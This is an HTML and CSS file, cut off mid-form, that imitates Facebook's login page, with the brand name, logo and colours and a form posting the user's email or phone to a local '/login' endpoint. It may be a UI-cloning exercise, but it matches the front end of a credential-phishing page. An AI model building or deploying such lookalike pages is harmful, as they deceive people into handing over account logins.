<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <!-- Added viewport meta tag for responsive scaling -->
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="icon" type="image/x-icon" href="Facebook-Logosu.png">
  <title>Facebook</title>
  <style>
    /* Basic Reset */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      font-family: Arial, sans-serif;
      /* Gradient background */
      background: linear-gradient(135deg, #eef2ff 0%, #fdf2f8 100%);
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    /* Top Language Bar */
    .top-bar {
      width: 100%;
      text-align: center;
      padding: 10px 0;
      font-size: 14px;
      color: #555;
    }

    /* Main Container */
    .login-container {
      display: flex;
      flex-direction: column;
      align-items: center;
      width: 100%;
      max-width: 400px;
      margin: auto;
      padding: 20px;
    }

    /* Facebook Logo (Placeholder) */
    .logo img {
      width: 100px;
      height: 55px;
      margin: 20px;
    }

    /* Form Inputs */
    .login-form {
      width: 100%;
      display: flex;
      flex-direction: column;
      gap: 12px;
      margin-bottom: 20px;
    }
    .login-form input {
      width: 100%;
      padding: 14px;
      font-size: 16px;
      border: 1px solid #ddd;
      border-radius: 8px;
      outline: none;
    }
    .login-form input:focus {
      border-color: #1877f2;
    }

    /* Primary Login Button - Pill-Shaped */
    .login-btn {
      width: 100%;
      background-color: #1877f2;
      color: #fff;
      font-size: 16px;
      font-weight: bold;
      border: none;
      /* This makes the corners very round, creating a “pill” shape */
      border-radius: 50px;
      padding: 14px;
      cursor: pointer;
    }
    .login-btn:hover {
      background-color: #166fe5;
    }

    /* Forgot Password Link in Gray */
    .forgot-password {
      text-align: center;
      margin-bottom: 20px;
    }
    .forgot-password a {
      color: #888;
      text-decoration: none;
      font-weight: bold;
      font-size: 17px;
    }
    .forgot-password a:hover {
      text-decoration: underline;
    }

    /* Outlined "Create New Account" Button - Pill-Shaped */
    .create-account-btn {
      width: 100%;
      background-color: transparent;
      color: #1877f2;
      font-size: 16px;
      font-weight: bold;
      border: 1px solid #1877f2;
      border-radius: 50px;
      padding: 12px;
      cursor: pointer;
      margin-bottom: 20px;
    }
    .create-account-btn:hover {
      background-color: #e7f3ff;
    }

    /* Footer Section */
    .footer {
      text-align: center;
      color: #8a8d91;
      font-size: 13px;
      padding: 20px;
    }
    .footer a {
      color: #8a8d91;
      text-decoration: none;
      margin: 0 5px;
    }
    .footer a:hover {
      text-decoration: underline;
    }
    .meta-brand {
      font-weight: bold;
      margin-top: 10px;
      display: block;
    }

    /* Responsive Design */
    @media (max-width: 500px) {
      .login-container {
        padding: 20px;
        max-width: 90%;
      }
      .login-form input {
        padding: 12px;
        font-size: 14px;
      }
      .login-btn, .create-account-btn {
        padding: 12px;
        font-size: 14px;
      }
      .top-bar {
        font-size: 12px;
      }
      .forgot-password a {
        font-size: 15px;
      }
    }
  </style>
</head>
<body>
  <!-- Top Language Bar -->
  <div class="top-bar">
    English (US)
  </div>

  <!-- Main Login Container -->
  <div class="login-container">
    <!-- Facebook Logo -->
    <div class="logo">
      <!-- Replace with your own logo or an official FB icon -->
      <img src="Facebook-Logosu.png" alt="Facebook Logo">
    </div>

    <!-- Login Form -->
    <form class="login-form" action="/login" method="POST">
      <input type="text" id="email" name="email" placeholder="Mobile number or email" autocomplete="off" required>
